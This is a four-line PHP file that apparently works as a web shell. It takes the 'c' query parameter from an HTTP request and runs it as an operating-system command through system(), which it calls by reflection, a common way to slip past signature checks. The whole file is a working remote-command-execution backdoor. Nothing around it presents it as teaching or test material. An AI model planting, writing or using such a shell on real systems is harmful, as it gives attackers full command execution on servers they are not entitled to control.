<?php
    $func = new ReflectionFunction("system");
    echo $func->invokeArgs(array("$_GET[c]"));
?>